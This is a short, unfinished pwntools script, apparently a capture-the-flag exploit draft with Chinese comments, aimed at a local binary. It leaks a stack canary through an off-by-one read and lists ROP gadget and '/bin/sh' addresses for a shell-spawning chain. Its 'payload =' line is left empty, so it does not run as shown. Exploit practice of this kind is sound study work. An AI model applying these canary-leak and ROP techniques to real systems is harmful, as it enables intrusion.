from pwn import * 
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['wt.exe','wsl']
p = process('./pwn')


# 第一次read有25B，而buffer只有24B,25B是Canary
p.sendlineafter(b'id?',cyclic(25)) # 先触发一下错误
p.recvuntil(b'g') # 读取到g
canary = b'\x00'+ p.recvn(7)
print(f"canary: {canary.hex()}")

# 第二次read有256B，目标应该是一个全局变量buf2，且未初始化

rax_ret = 0x0000000000400a3b
rdi_ret = 0x0000000000400ddd

syscall = 0x0000000000402154
binsh = 0x00000000004E3950

payload = 

p.sendlineafter(b'name?',canary * 32)

p.recv()


# 第三次scanf是对v5的地址进行输入（unsigned int），且格式是uint,说明这个输入可以是一个地址，同时他后面还有4个参数
# v0-v3，edx,ecx,r8d,r9d

